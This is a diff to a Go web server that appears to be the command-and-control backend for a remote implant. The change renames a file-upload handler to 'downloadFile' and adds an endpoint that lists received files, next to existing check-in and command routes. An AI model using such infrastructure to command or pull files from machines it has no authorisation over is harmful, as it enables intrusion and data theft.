@@ -70,12 +70,12 @@ func checkIn(w http.ResponseWriter, r *http.Request) {
 	render.JSON(w, r, rbhttp.CheckInResponse{Command: encodedCmd})
 }
 
-func uploadFile(w http.ResponseWriter, r *http.Request) {
+func downloadFile(w http.ResponseWriter, r *http.Request) {
 	// Create destination file
 	filePath := filepath.Join(fileStoragePath, uuid.New().String())
 	destFile, err := os.Create(filePath)
 	if err != nil {
-		zap.L().Error("uploadFile - create file", zap.Error(err))
+		zap.L().Error("downloadFile - create file", zap.Error(err))
 		errorResponse(w, r, 500, fmt.Sprintf("failed to create file: %v", err))
 		return
 	}
@@ -84,7 +84,7 @@ func uploadFile(w http.ResponseWriter, r *http.Request) {
 	// Stream directly from request body to disk
 	_, err = io.Copy(destFile, r.Body)
 	if err != nil {
-		zap.L().Error("uploadFile - copy file", zap.Error(err))
+		zap.L().Error("downloadFile - copy file", zap.Error(err))
 		// Clean up partial file on error
 		os.Remove(filePath)
 		errorResponse(w, r, 400, fmt.Sprintf("failed to write file: %v", err))
@@ -127,6 +127,35 @@ func fetchResponses(w http.ResponseWriter, r *http.Request) {
 	render.JSON(w, r, responses.Responses)
 }
 
+type FileInfo struct {
+	Name    string    `json:"name"`
+	Size    int64     `json:"size"`
+	ModTime time.Time `json:"modTime"`
+}
+
+func fetchFiles(w http.ResponseWriter, r *http.Request) {
+	files, err := os.ReadDir(fileStoragePath)
+	if err != nil {
+		zap.L().Error("fetchFiles - read directory", zap.Error(err))
+		errorResponse(w, r, 500, fmt.Sprintf("failed to read directory: %v", err))
+		return
+	}
+	fileInfos := make([]FileInfo, 0)
+	for _, f := range files {
+		info, err := f.Info()
+		if err != nil {
+			zap.L().Error("fetchFiles - get info", zap.Error(err))
+			continue
+		}
+		fileInfos = append(fileInfos, FileInfo{
+			Name:    f.Name(),
+			Size:    info.Size(),
+			ModTime: info.ModTime(),
+		})
+	}
+	render.JSON(w, r, fileInfos)
+}
+
 func main() {
 	r := chi.NewRouter()
 	r.Use(middleware.Logger)
@@ -151,7 +180,8 @@ func main() {
 	r.Post("/command", newCommand)
 	r.Get("/responses", fetchResponses)
 	r.Get("/last_checkin", getLastCheckin)
-	r.Post("/upload", uploadFile)
+	r.Post("/download", downloadFile)
+	r.Get("/files", fetchFiles)
 
 	zap.L().Info("Server running", zap.Int("port", config.PORT_NUMBER))
 	http.ListenAndServe(fmt.Sprintf("0.0.0.0:%d", config.PORT_NUMBER), r)
